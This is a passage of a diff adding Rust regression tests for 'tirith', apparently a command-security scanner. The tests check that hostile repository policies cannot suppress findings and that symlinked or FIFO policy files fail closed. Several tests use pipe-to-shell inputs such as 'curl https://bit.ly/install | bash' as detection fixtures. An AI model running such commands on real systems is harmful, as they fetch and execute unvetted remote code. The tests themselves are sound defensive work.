+        p.package_policy.block_aggregate_score.is_none(),
+        "repo raised block_aggregate_score must be reset to the baseline (None)"
+    );
+    assert!(
+        p.threat_intel.osv_enabled,
+        "repo threat_intel.osv_enabled:false must be reset to default true"
+    );
+    assert!(
+        p.threat_intel.deps_dev_enabled,
+        "repo threat_intel.deps_dev_enabled:false must be reset to default true"
+    );
+    assert!(
+        p.allowed_install_domains.is_empty(),
+        "repo allowed_install_domains must be cleared (no PasteSourceMismatch downgrade)"
+    );
+    assert!(
+        p.scan.trusted_mcp_servers.is_empty(),
+        "repo scan.trusted_mcp_servers must be cleared (no MCP-finding silencing)"
+    );
+    assert!(
+        p.scan.ignore_patterns.is_empty(),
+        "repo scan.ignore_patterns must be cleared (no scan-walk suppression)"
+    );
+}
+
+#[test]
+fn test_f9_repo_allowlist_cannot_drop_finding_through_engine() {
+    // The end-to-end invariant: a hostile repo allowlist/allowlist_rules cannot
+    // suppress a finding that fires without it. bit.ly → ShortenedUrl is exactly
+    // what `allowlist: [bit.ly]` would drop pre-F9.
+    let _global = isolated_policy_state();
+
+    let repo = make_repo(HOSTILE_POLICY_YAML);
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::ShortenedUrl),
+        "ShortenedUrl must survive a hostile repo allowlist. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| f.rule_id.to_string())
+            .collect::<Vec<_>>()
+    );
+    // And the pipe-to-shell must still block despite the repo's LOW override +
+    // curl_pipe_shell allowlist_rule.
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::CurlPipeShell),
+        "CurlPipeShell must survive the repo's allowlist_rule + LOW override"
+    );
+    assert_eq!(
+        verdict.action,
+        Action::Block,
+        "neutralized repo policy must not relax the verdict to Allow/Warn"
+    );
+}
+
+#[test]
+fn test_f9_repo_can_still_tighten_with_blocklist() {
+    // Tightening is preserved: a repo blocklist still forces a Block. Proves the
+    // sanitizer is surgical (suppression off, restriction on).
+    let _global = isolated_policy_state();
+
+    let policy = r#"
+fail_mode: open
+blocklist:
+  - normally-fine.example.com
+"#;
+    let repo = make_repo(policy);
+    let cwd = repo.path().to_str().unwrap();
+    // A bare https GET to a domain that would otherwise be benign.
+    let verdict = analyze_exec("curl https://normally-fine.example.com/app.tar.gz", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        "repo blocklist (a tightening) must still fire PolicyBlocklisted"
+    );
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_f9_repo_flat_allowlist_file_is_ignored_but_blocklist_honored() {
+    // The flat-file twin of F9: `load_org_lists` reads the repo `.tirith/`
+    // allowlist/blocklist text files. The repo allowlist (suppression) must be
+    // ignored; the repo blocklist (tightening) must still apply.
+    let _global = isolated_policy_state();
+
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(repo.path().join(".tirith/allowlist"), "bit.ly\n").unwrap();
+    fs::write(
+        repo.path().join(".tirith/blocklist"),
+        "blocked-host.example.com\n",
+    )
+    .unwrap();
+    let cwd = repo.path().to_str().unwrap();
+
+    // allowlist must NOT suppress ShortenedUrl.
+    let v1 = analyze_exec("curl https://bit.ly/install", cwd);
+    assert!(
+        v1.findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::ShortenedUrl),
+        "repo flat allowlist must not suppress ShortenedUrl"
+    );
+
+    // blocklist must still force a Block.
+    let v2 = analyze_exec("curl https://blocked-host.example.com/x", cwd);
+    assert!(
+        v2.findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        "repo flat blocklist must still fire PolicyBlocklisted"
+    );
+    assert_eq!(v2.action, Action::Block);
+}
+
+#[test]
+fn test_f9_org_scope_policy_is_honored() {
+    // TIRITH_POLICY_ROOT (org/CI mount) is operator-controlled: the SAME knobs
+    // that are neutralized at repo scope are honored here. allowlist_rules +
+    // severity_overrides must take effect → no findings → Allow.
+    let mut global = isolated_policy_state();
+
+    let org = TempDir::new().unwrap();
+    let org_tirith = org.path().join(".tirith");
+    fs::create_dir_all(&org_tirith).unwrap();
+    fs::write(
+        org_tirith.join("policy.yaml"),
+        r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - example.com/install.sh
+"#,
+    )
+    .unwrap();
+
+    // A non-repo cwd so the walk-up branch finds nothing and the org branch wins.
+    let plain_cwd = TempDir::new().unwrap();
+
+    global.set_env("TIRITH_POLICY_ROOT", org.path());
+    let p = Policy::discover_local_only(plain_cwd.path().to_str());
+    let verdict = analyze_exec(
+        "curl https://example.com/install.sh | bash",
+        plain_cwd.path().to_str().unwrap(),
+    );
+    global.remove_env("TIRITH_POLICY_ROOT");
+
+    assert_eq!(p.scope, PolicyScope::Org, "TIRITH_POLICY_ROOT stamps Org");
+    assert_eq!(
+        p.allowlist_rules.len(),
+        1,
+        "org allowlist_rules must be honored (not sanitized)"
+    );
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .all(|f| f.rule_id != RuleId::CurlPipeShell),
+        "org-scope allowlist_rule must suppress CurlPipeShell. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| f.rule_id.to_string())
+            .collect::<Vec<_>>()
+    );
+    assert_eq!(verdict.action, Action::Allow);
+}
+
+#[test]
+fn test_f9_org_scope_guard_disable_knobs_are_honored() {
+    // Counterpart to the repo-scope guard-disable sanitization: the SAME
+    // weakening knobs that F9 neutralizes at repo scope (context_guard_enabled,
+    // a weakening package_policy, threat_intel.osv_enabled) MUST be honored at
+    // org scope (TIRITH_POLICY_ROOT — operator-controlled). Asserting on the
+    // loaded policy object: org scope leaves them exactly as written.
+    let mut global = isolated_policy_state();
+
+    set_org_policy(
+        &mut global,
+        r#"
+fail_mode: open
+context_guard_enabled: false
+package_policy:
+  block_dependency_confusion: false
+  block_aggregate_score: 100
+threat_intel:
+  osv_enabled: false
+  deps_dev_enabled: false
+allowed_install_domains:
+  - install.example
+scan:
+  trusted_mcp_servers:
+    - corp-mcp
+  ignore_patterns:
+    - "vendor/**"
+"#,
+    );
+    // A non-repo cwd so the walk-up branch finds nothing and the org branch wins.
+    let plain_cwd = TempDir::new().unwrap();
+
+    let p = Policy::discover_local_only(plain_cwd.path().to_str());
+    global.remove_env("TIRITH_POLICY_ROOT");
+
+    assert_eq!(p.scope, PolicyScope::Org, "TIRITH_POLICY_ROOT stamps Org");
+    assert!(
+        !p.context_guard_enabled,
+        "org context_guard_enabled:false must be HONORED (not reset)"
+    );
+    assert!(
+        !p.package_policy.block_dependency_confusion,
+        "org package_policy demotion must be HONORED"
+    );
+    assert_eq!(
+        p.package_policy.block_aggregate_score,
+        Some(100),
+        "org raised block_aggregate_score must be HONORED"
+    );
+    assert!(
+        !p.threat_intel.osv_enabled,
+        "org threat_intel.osv_enabled:false must be HONORED"
+    );
+    assert!(
+        !p.threat_intel.deps_dev_enabled,
+        "org threat_intel.deps_dev_enabled:false must be HONORED"
+    );
+    assert_eq!(
+        p.allowed_install_domains,
+        vec!["install.example".to_string()],
+        "org allowed_install_domains must be HONORED"
+    );
+    assert_eq!(
+        p.scan.trusted_mcp_servers,
+        vec!["corp-mcp".to_string()],
+        "org scan.trusted_mcp_servers must be HONORED"
+    );
+    assert_eq!(
+        p.scan.ignore_patterns,
+        vec!["vendor/**".to_string()],
+        "org scan.ignore_patterns must be HONORED"
+    );
+}
+
+#[test]
+fn test_f9_org_scope_allowlist_rules_case_insensitive_rule_id() {
+    // Org-scope positive coverage for case-insensitive `rule_id` matching. This
+    // sub-feature used to be pinned at REPO scope in `bypass_regression.rs`, but
+    // F9 neutralizes a repo `allowlist_rules` regardless of casing, so those
+    // tests were flipped to assert non-suppression. The case-insensitive MATCHER
+    // (`is_allowlisted_for_rule`'s `eq_ignore_ascii_case`) is exercised here
+    // instead: at org scope an UPPERCASE `SHORTENED_URL` rule_id must still match
+    // the lowercase `ShortenedUrl` finding and suppress it.
+    let mut global = isolated_policy_state();
+
+    set_org_policy(
+        &mut global,
+        "fail_mode: open\nallowlist_rules:\n  - rule_id: SHORTENED_URL\n    patterns:\n      - bit.ly\n",
+    );
+    // A non-repo cwd so the walk-up branch finds nothing and the org branch wins.
+    let plain_cwd = TempDir::new().unwrap();
+
+    let p = Policy::discover_local_only(plain_cwd.path().to_str());
+    let verdict = analyze_exec(
+        "curl https://bit.ly/install | bash",
+        plain_cwd.path().to_str().unwrap(),
+    );
+    global.remove_env("TIRITH_POLICY_ROOT");
+
+    assert_eq!(p.scope, PolicyScope::Org, "TIRITH_POLICY_ROOT stamps Org");
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .all(|f| f.rule_id != RuleId::ShortenedUrl),
+        "org-scope allowlist_rules with an uppercase rule_id must match \
+         case-insensitively and suppress ShortenedUrl. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| f.rule_id.to_string())
+            .collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn test_f9_org_scope_severity_override_is_honored() {
+    // Counterpart to `test_repo_severity_override_*`: at org scope the override
+    // DOES apply.
+    let mut global = isolated_policy_state();
+
+    let org = TempDir::new().unwrap();
+    let org_tirith = org.path().join(".tirith");
+    fs::create_dir_all(&org_tirith).unwrap();
+    fs::write(
+        org_tirith.join("policy.yaml"),
+        "severity_overrides:\n  shortened_url: CRITICAL\n",
+    )
+    .unwrap();
+    let plain_cwd = TempDir::new().unwrap();
+
+    global.set_env("TIRITH_POLICY_ROOT", org.path());
+    let verdict = analyze_exec(
+        "curl https://bit.ly/install",
+        plain_cwd.path().to_str().unwrap(),
+    );
+    global.remove_env("TIRITH_POLICY_ROOT");
+
+    let shortened = verdict
+        .findings
+        .iter()
+        .find(|f| f.rule_id == RuleId::ShortenedUrl)
+        .expect("ShortenedUrl should fire");
+    assert_eq!(
+        shortened.severity,
+        Severity::Critical,
+        "org-scope severity_overrides must escalate ShortenedUrl to CRITICAL"
+    );
+}
+
+#[test]
+fn test_f9_user_scope_allowlist_is_honored() {
+    // User config (XDG_CONFIG_HOME/tirith/policy.yaml) is operator-controlled and
+    // honored in full. allowlist must suppress ShortenedUrl → Allow.
+    let mut global = isolated_policy_state();
+
+    let cfg = global.roots().xdg_config.clone();
+    let tirith_cfg = cfg.join("tirith");
+    fs::create_dir_all(&tirith_cfg).unwrap();
+    fs::write(
+        tirith_cfg.join("policy.yaml"),
+        "fail_mode: open\nallowlist:\n  - bit.ly\n",
+    )
+    .unwrap();
+    // Non-repo cwd so user is the matching branch.
+    let plain_cwd = TempDir::new().unwrap();
+
+    // `user_policy_path` resolves the user config dir via etcetera, which reads
+    // XDG_CONFIG_HOME on unix but APPDATA/LOCALAPPDATA on Windows. Set all three to
+    // the isolated config dir so the user policy is found cross-platform (this
+    // binary's Windows CI job runs this test).
+    global.set_env("XDG_CONFIG_HOME", &cfg);
+    global.set_env("APPDATA", &cfg);
+    global.set_env("LOCALAPPDATA", &cfg);
+    let p = Policy::discover_local_only(plain_cwd.path().to_str());
+    let verdict = analyze_exec(
+        "curl https://bit.ly/install",
+        plain_cwd.path().to_str().unwrap(),
+    );
+    assert_eq!(p.scope, PolicyScope::User, "user config stamps User");
+    assert!(
+        !p.allowlist.is_empty(),
+        "user allowlist must be honored (not sanitized)"
+    );
+    assert_eq!(
+        verdict.action,
+        Action::Allow,
+        "user-scope allowlist must suppress ShortenedUrl → Allow. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| f.rule_id.to_string())
+            .collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn test_f8_ambient_api_key_not_paired_with_repo_server_url() {
+    // F8: an ambient TIRITH_API_KEY must never authenticate to a server URL that
+    // came from a repo-scoped policy. The hostile repo declares a
+    // policy_server_url; after discovery it must be gone (F9) and no remote fetch
+    // (path is not `remote:`), so the ambient key has nothing repo-scoped to pair
+    // with. (No network mock — we assert the observable sanitized state.)
+    let mut global = isolated_policy_state();
+
+    let repo = make_repo(HOSTILE_POLICY_YAML);
+    let cwd = repo.path().to_str().unwrap();
+
+    global.set_env("TIRITH_API_KEY", "ambient-key-from-shell");
+    // Deliberately DO NOT set TIRITH_SERVER_URL: the only URL on offer is the
+    // repo-planted one, which must be refused.
+    let p = Policy::discover(Some(cwd));
+    global.remove_env("TIRITH_API_KEY");
+
+    assert_eq!(p.scope, PolicyScope::Repo);
+    assert!(
+        p.policy_server_url.is_none(),
+        "repo-planted policy_server_url must not survive discovery"
+    );
+    let path = p.path.unwrap_or_default();
+    assert!(
+        !path.starts_with("remote:"),
+        "ambient key must not have driven a fetch to the repo URL (path was {path})"
+    );
+}
+
+// ===========================================================================
+// F17 — label writes must not follow symlinks
+// ===========================================================================
+
+#[cfg(unix)]
+#[test]
+fn test_f17_write_label_refuses_symlinked_final_file() {
+    use std::os::unix::fs::symlink;
+
+    let repo = TempDir::new().unwrap();
+    let tirith = repo.path().join(".tirith");
+    fs::create_dir_all(&tirith).unwrap();
+
+    // Pre-plant a symlink at the label path pointing at a sensitive target.
+    let secret = repo.path().join("SECRET");
+    fs::write(&secret, "original-secret\n").unwrap();
+    let label_path = tirith.join("context-labels.yaml");
+    symlink(&secret, &label_path).unwrap();
+
+    let err = tirith_core::policy::write_context_label(&label_path, "aws:prod", "critical")
+        .expect_err("writing through a symlinked label file must fail");
+    // open_write_no_follow maps the symlinked final component to an error.
+    assert!(
+        matches!(
+            err.kind(),
+            std::io::ErrorKind::Other
+                | std::io::ErrorKind::PermissionDenied
+                | std::io::ErrorKind::InvalidInput
+                | std::io::ErrorKind::AlreadyExists
+        ) || err.raw_os_error().is_some(),
+        "expected a refusal error, got {err:?}"
+    );
+    // The sensitive target must be untouched.
+    assert_eq!(
+        fs::read_to_string(&secret).unwrap(),
+        "original-secret\n",
+        "the symlink target must not have been overwritten"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn test_f17_write_label_refuses_symlinked_tirith_dir() {
+    use std::os::unix::fs::symlink;
+
+    // `.tirith` itself is a symlink escaping the repo root → the containment
+    // guard (canonical_within against the grandparent) must reject the write.
+    let repo = TempDir::new().unwrap();
+    let outside = TempDir::new().unwrap();
+    let symlinked_tirith = repo.path().join(".tirith");
+    symlink(outside.path(), &symlinked_tirith).unwrap();
+
+    let label_path = symlinked_tirith.join("context-labels.yaml");
+    let err = tirith_core::policy::write_context_label(&label_path, "aws:prod", "critical")
+        .expect_err("a symlinked .tirith dir must be rejected");
+    assert_eq!(
+        err.kind(),
+        std::io::ErrorKind::PermissionDenied,
+        "containment guard should reject with PermissionDenied, got {err:?}"
+    );
+    // Nothing should have been written into the escape target.
+    assert!(
+        !outside.path().join("context-labels.yaml").exists(),
+        "no label file should have been created in the escape target"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn test_f17_write_label_succeeds_for_legitimate_path() {
+    // The happy path still works: a real `.tirith` dir under the repo root, no
+    // symlinks. Confirms the hardening didn't break normal label writes.
+    let repo = TempDir::new().unwrap();
+    fs::create_dir_all(repo.path().join(".git")).unwrap();
+    let label_path = repo.path().join(".tirith").join("context-labels.yaml");
+
+    tirith_core::policy::write_context_label(&label_path, "aws:prod", "critical")
+        .expect("legit label write must succeed");
+    let written = fs::read_to_string(&label_path).unwrap();
+    assert!(
+        written.contains("aws:prod") && written.contains("critical"),
+        "label file should contain the written entry, got: {written}"
+    );
+
+    // A second write preserves the first entry and adds the new one (read-back
+    // goes through the symlink-refusing merge).
+    tirith_core::policy::write_context_label(&label_path, "gcp:prod", "production")
+        .expect("second legit label write must succeed");
+    let written = fs::read_to_string(&label_path).unwrap();
+    assert!(
+        written.contains("aws:prod") && written.contains("gcp:prod"),
+        "second write must preserve the first entry, got: {written}"
+    );
+}
+
+// ===========================================================================
+// F9 — trust.json suppression boundary
+// ===========================================================================
+
+/// A trust store whose single entry would allowlist `bit.ly` (no `rule_id` →
+/// plain allowlist) and so suppress `ShortenedUrl`. The far-future `ttl_expires`
+/// keeps it non-expired without pulling in a clock dependency.
+const BIT_LY_TRUST_JSON: &str = r#"{
+  "entries": [
+    { "pattern": "bit.ly", "ttl_expires": "2999-01-01T00:00:00Z" }
+  ]
+}"#;
+
+#[test]
+fn test_f9_repo_trust_json_does_not_suppress_finding() {
+    // F9 — a malicious repo can SHIP a pre-populated `.tirith/trust.json` with a
+    // non-expired allowlist entry. Pre-fix, `load_trust_entries` merged it into
+    // the allowlist and recovered exactly the suppression channel F9 removes. The
+    // repo trust.json must now be ignored: `ShortenedUrl` on bit.ly still fires.
+    let _global = isolated_policy_state();
+
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(repo.path().join(".tirith/trust.json"), BIT_LY_TRUST_JSON).unwrap();
+    let cwd = repo.path().to_str().unwrap();
+
+    let verdict = analyze_exec("curl https://bit.ly/install", cwd);
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::ShortenedUrl),
+        "repo .tirith/trust.json must NOT suppress ShortenedUrl. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| f.rule_id.to_string())
+            .collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn test_f9_user_trust_json_is_still_honored() {
+    // The other half of the boundary: the USER `config_dir/trust.json` is
+    // operator-controlled and trusted, so a non-expired entry there IS still
+    // honored and suppresses ShortenedUrl → Allow. (Mirrors
+    // `test_f9_user_scope_allowlist_is_honored` for the trust-store path.)
+    let mut global = isolated_policy_state();
+
+    let cfg = global.roots().xdg_config.clone();
+    let tirith_cfg = cfg.join("tirith");
+    fs::create_dir_all(&tirith_cfg).unwrap();
+    fs::write(tirith_cfg.join("trust.json"), BIT_LY_TRUST_JSON).unwrap();
+    // Non-repo cwd so no repo branch interferes; the user trust store is the only
+    // suppression on offer.
+    let plain_cwd = TempDir::new().unwrap();
+
+    // `config_dir` resolves via etcetera: XDG_CONFIG_HOME on unix, APPDATA /
+    // LOCALAPPDATA on Windows. Set all three so the user trust store is found
+    // cross-platform.
+    global.set_env("XDG_CONFIG_HOME", &cfg);
+    global.set_env("APPDATA", &cfg);
+    global.set_env("LOCALAPPDATA", &cfg);
+    let verdict = analyze_exec(
+        "curl https://bit.ly/install",
+        plain_cwd.path().to_str().unwrap(),
+    );
+    assert_eq!(
+        verdict.action,
+        Action::Allow,
+        "user-scope trust.json must suppress ShortenedUrl → Allow. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| f.rule_id.to_string())
+            .collect::<Vec<_>>()
+    );
+}
+
+// ===========================================================================
+// F9 — empty TIRITH_POLICY_ROOT must not reclassify a repo policy as Org
+// ===========================================================================
+
+#[test]
+fn test_f9_empty_policy_root_does_not_reclassify_repo_as_org() {
+    // `TIRITH_POLICY_ROOT=""` → `PathBuf::from("").join(".tirith")` == `./.tirith`
+    // (relative to cwd). Pre-fix that matched the REPO's own policy and stamped it
+    // Org, skipping repo-scope sanitization. With the empty value treated as unset,
+    // the repo policy stays Repo and the hostile suppression fields are neutralized.
+    let mut global = isolated_policy_state();
+
+    let repo = make_repo(HOSTILE_POLICY_YAML);
+    let cwd = repo.path().to_str().unwrap();
+
+    global.set_env("TIRITH_POLICY_ROOT", "   ");
+    let p = Policy::discover_local_only(Some(cwd));
+    global.remove_env("TIRITH_POLICY_ROOT");
+
+    assert_eq!(
+        p.scope,
+        PolicyScope::Repo,
+        "empty/whitespace TIRITH_POLICY_ROOT must not stamp the repo policy Org"
+    );
+    // And the sanitization that Org scope would have skipped did run.
+    assert!(
+        p.allowlist.is_empty(),
+        "repo allowlist must be sanitized (proves repo scope, not Org)"
+    );
+    assert!(
+        !p.allow_bypass_env,
+        "repo allow_bypass_env must be sanitized to false (proves repo scope, not Org)"
+    );
+
+    // End-to-end: the hostile repo's curl_pipe_shell LOW override + allowlist_rule
+    // must not relax the verdict.
+    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);
+    assert_eq!(
+        verdict.action,
+        Action::Block,
+        "empty TIRITH_POLICY_ROOT must not let the repo policy relax the verdict"
+    );
+}
+
+// ===========================================================================
+// F-policy-read — a hostile repo policy file must fail closed, not hang/leak
+// ===========================================================================
+
+#[cfg(unix)]
+#[test]
+fn test_policy_file_fifo_fails_closed() {
+    // A repo can make `.tirith/policy.yaml` a FIFO. The no-follow, size-capped
+    // reader opens it O_NONBLOCK and rejects it as not-a-regular-file, so the read
+    // fails closed instead of hanging on a writer that never arrives.
+    let _global = isolated_policy_state();
+    let repo = TempDir::new().unwrap();
+    fs::create_dir_all(repo.path().join(".git")).unwrap();
+    let tirith = repo.path().join(".tirith");
+    fs::create_dir_all(&tirith).unwrap();
+    let fifo = tirith.join("policy.yaml");
+
+    let cpath = std::ffi::CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
+    // SAFETY: cpath is a valid NUL-terminated path; 0o600 is a valid mode.
+    let rc = unsafe { libc::mkfifo(cpath.as_ptr(), 0o600) };
+    assert_eq!(rc, 0, "mkfifo must succeed to set up the FIFO policy file");
+
+    let p = Policy::discover_local_only(repo.path().to_str());
+    assert_eq!(
+        p.fail_mode,
+        tirith_core::policy::FailMode::Closed,
+        "a FIFO policy file must fail closed (path={:?})",
+        p.path
+    );
+    assert_eq!(
+        p.path.as_deref(),
+        Some("fail-closed"),
+        "fail-closed policy must be stamped, not parsed as a real file"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn test_policy_file_symlink_fails_closed() {
+    use std::os::unix::fs::symlink;
+
+    // A repo can plant a symlink at `.tirith/policy.yaml` pointing at an arbitrary
+    // file. O_NOFOLLOW rejects the final-component symlink (ELOOP → not-regular),
+    // so the policy read fails closed and the link target is never consumed.
+    let _global = isolated_policy_state();
+    let repo = TempDir::new().unwrap();
+    fs::create_dir_all(repo.path().join(".git")).unwrap();
+    let tirith = repo.path().join(".tirith");
+    fs::create_dir_all(&tirith).unwrap();
+
+    // A benign, valid target — the point is that we must refuse to FOLLOW it.
+    let target = repo.path().join("real-policy.yaml");
+    fs::write(&target, "fail_mode: open\n").unwrap();
+    symlink(&target, tirith.join("policy.yaml")).unwrap();
+
+    let p = Policy::discover_local_only(repo.path().to_str());
+    assert_eq!(
+        p.fail_mode,
+        tirith_core::policy::FailMode::Closed,
+        "a symlinked policy file must fail closed, not follow the link (path={:?})",
+        p.path
+    );
+    assert_eq!(
+        p.path.as_deref(),
+        Some("fail-closed"),
+        "fail-closed policy must be stamped"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn test_user_policy_symlink_to_regular_file_is_trusted_and_loaded() {
+    use std::os::unix::fs::symlink;
+
+    let mut global = isolated_policy_state();
+    let cfg = global.roots().xdg_config.clone();
+    let tirith_cfg = cfg.join("tirith");
+    fs::create_dir_all(&tirith_cfg).unwrap();
+    let target = cfg.join("nix-store-policy.yaml");
+    fs::write(&target, "fail_mode: open\nallowlist:\n  - bit.ly\n").unwrap();
+    symlink(&target, tirith_cfg.join("policy.yaml")).unwrap();
+
+    global.set_env("XDG_CONFIG_HOME", &cfg);
+    global.set_env("APPDATA", &cfg);
+    global.set_env("LOCALAPPDATA", &cfg);
+    let plain_cwd = TempDir::new().unwrap();
+    let policy = Policy::discover_local_only(plain_cwd.path().to_str());
+
+    assert_eq!(policy.scope, PolicyScope::User);
+    assert_eq!(policy.allowlist, vec!["bit.ly"]);
+    assert!(
+        policy
+            .path
+            .as_deref()
+            .is_some_and(|path| path.ends_with("tirith/policy.yaml")),
+        "diagnostics retain the configured symlink path: {:?}",
+        policy.path
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn test_org_policy_symlink_to_regular_file_is_trusted_and_loaded() {
+    use std::os::unix::fs::symlink;
+
+    let mut global = isolated_policy_state();
+    let org = TempDir::new().unwrap();
+    let tirith = org.path().join(".tirith");
+    fs::create_dir_all(&tirith).unwrap();
+    let target = org.path().join("immutable-policy.yaml");
+    fs::write(&target, "fail_mode: closed\nparanoia: 4\n").unwrap();
+    symlink(&target, tirith.join("policy.yaml")).unwrap();
+    global.set_env("TIRITH_POLICY_ROOT", org.path());
+
+    let plain_cwd = TempDir::new().unwrap();
+    let policy = Policy::discover_local_only(plain_cwd.path().to_str());
+    assert_eq!(policy.scope, PolicyScope::Org);
+    assert_eq!(policy.fail_mode, tirith_core::policy::FailMode::Closed);
+    assert_eq!(policy.paranoia, 4);
+    assert!(
+        policy
+            .path
+            .as_deref()
+            .is_some_and(|path| path.ends_with(".tirith/policy.yaml")),
+        "diagnostics retain the configured org symlink path: {:?}",
+        policy.path
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn test_broken_user_policy_symlink_is_named_and_fails_closed() {
+    use std::os::unix::fs::symlink;
+
+    let mut global = isolated_policy_state();
+    let cfg = global.roots().xdg_config.clone();
+    let tirith_cfg = cfg.join("tirith");
+    fs::create_dir_all(&tirith_cfg).unwrap();
+    symlink(
+        cfg.join("missing-policy.yaml"),
+        tirith_cfg.join("policy.yaml"),
+    )
+    .unwrap();
+
+    global.set_env("XDG_CONFIG_HOME", &cfg);
+    global.set_env("APPDATA", &cfg);
+    global.set_env("LOCALAPPDATA", &cfg);
+    let plain_cwd = TempDir::new().unwrap();
+    let policy = Policy::discover_local_only(plain_cwd.path().to_str());
+
+    assert_eq!(policy.path.as_deref(), Some("fail-closed"));
+    assert_eq!(policy.fail_mode, tirith_core::policy::FailMode::Closed);
+}
+
+#[cfg(unix)]
+#[test]
+fn test_unsafe_user_policy_symlink_targets_fail_closed_without_blocking() {
+    use std::os::unix::fs::symlink;
+
+    let mut global = isolated_policy_state();
+    let cfg = global.roots().xdg_config.clone();
+    let tirith_cfg = cfg.join("tirith");
+    fs::create_dir_all(&tirith_cfg).unwrap();
+    global.set_env("XDG_CONFIG_HOME", &cfg);
+    global.set_env("APPDATA", &cfg);
+    global.set_env("LOCALAPPDATA", &cfg);
+    let plain_cwd = TempDir::new().unwrap();
+    let link = tirith_cfg.join("policy.yaml");
+
+    let assert_fails_closed = |label: &str| {
+        let policy = Policy::discover_local_only(plain_cwd.path().to_str());
+        assert_eq!(
+            policy.path.as_deref(),
+            Some("fail-closed"),
+            "unsafe trusted-policy target did not fail closed: {label}"
+        );
+        assert_eq!(
+            policy.fail_mode,
+            tirith_core::policy::FailMode::Closed,
+            "unsafe trusted-policy target changed fail mode: {label}"
+        );
+    };
+
+    symlink(&link, &link).unwrap();
+    assert_fails_closed("symlink loop");
+    fs::remove_file(&link).unwrap();
+
+    let fifo = cfg.join("policy-fifo");
+    let fifo_path = std::ffi::CString::new(fifo.as_os_str().to_str().unwrap()).unwrap();
+    // SAFETY: fifo_path is a valid NUL-terminated path and 0o600 is a valid mode.
+    assert_eq!(unsafe { libc::mkfifo(fifo_path.as_ptr(), 0o600) }, 0);
+    symlink(&fifo, &link).unwrap();
+    assert_fails_closed("FIFO target");
+    fs::remove_file(&link).unwrap();
+
+    let oversized = cfg.join("oversized-policy.yaml");
+    let oversized_file = fs::File::create(&oversized).unwrap();
+    oversized_file.set_len(1024 * 1024 + 1).unwrap();
+    symlink(&oversized, &link).unwrap();
+    assert_fails_closed("oversized target");
+    fs::remove_file(&link).unwrap();
+
+    let directory = cfg.join("policy-directory");
+    fs::create_dir_all(&directory).unwrap();
+    symlink(&directory, &link).unwrap();
+    assert_fails_closed("directory target");
+}
